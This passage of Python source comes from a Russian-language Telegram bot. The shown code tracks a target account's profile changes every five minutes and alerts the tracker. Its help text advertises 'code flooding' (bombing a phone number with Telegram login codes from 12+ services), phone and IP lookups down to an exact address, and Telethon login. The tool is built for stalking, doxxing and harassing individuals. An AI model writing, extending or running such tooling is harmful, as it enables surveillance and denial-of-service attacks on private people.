                return
            
            # Сохраняем информацию
            if user_info:
                tracker.save_tracking_info(user_id, user_info)
                bot.send_message(message.chat.id, 
                               f"✅ Аккаунт @{username} добавлен для слежки!\n\n"
                               f"👤 Имя: {user_info['first_name']}\n"
                               f"📝 Username: @{user_info['username']}\n"
                               f"ℹ️ Bio: {user_info['bio'][:50]}...")
                
                # Запускаем периодическую проверку
                start_periodic_check(user_id, username)
            else:
                bot.send_message(message.chat.id, f"❌ Не удалось найти аккаунт @{username}")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Ошибка: {str(e)}")
    
    asyncio.run(add_tracking())

def start_periodic_check(user_id, username):
    """Запуск периодической проверки изменений"""
    def check_loop():
        while True:
            time.sleep(300)  # Проверка каждые 5 минут
            
            async def check():
                changes = await tracker.check_for_changes(user_id, username)
                if changes:
                    # Отправляем уведомление
                    text = f"⚠️ Обнаружены изменения в @{username}:\n\n"
                    for change in changes:
                        text += f"📝 {change['field']}:\n"
                        text += f"Было: {change['old']}\n"
                        text += f"Стало: {change['new']}\n\n"
                    
                    try:
                        bot.send_message(user_id, text)
                    except:
                        pass
            
            asyncio.run(check())
    
    thread = threading.Thread(target=check_loop, daemon=True)
    thread.start()

@bot.message_handler(func=lambda message: message.text == "❓ Помощь")
def help_handler(message):
    help_text = """
📋 Доступные функции:

📱 Флуд кодами - отправка кодов на номер
🔍 Пробив по номеру - информация о номере
🌐 Пробив по IP - геолокация по IP
👁 Слежка за аккаунтом - отслеживание изменений
🔐 Авторизация Telethon - настройка API

⚡ Флуд кодами:
- 12+ сервисов Telegram
- Асинхронные запросы
- Защита от злоупотреблений

🔍 Пробив по номеру:
- Страна, город, оператор
- Тип номера и валидность
- Проверка Одноклассников

🌐 Пробив по IP:
- Геолокация
- Провайдер
- Точный адрес

👁 Слежка:
- Изменение имени/username
- Изменение био
- Смена аватарки
- Автоуведомления

🔐 Авторизация:
- API ID/API Hash
- Авторизация по коду
- Безопасное хранение

⚙️ Админ-функции:
- Управление защитой
- Статистика
- Мониторинг

⚠️ Используйте responsibly!
    """
    bot.send_message(message.chat.id, help_text)

if __name__ == "__main__":
    print("🔥 Универсальный бот с расширенными функциями запущен...")
    print("⚠️ Не забудьте установить переменные ADMIN_ID в коде!")
    bot.infinity_polling()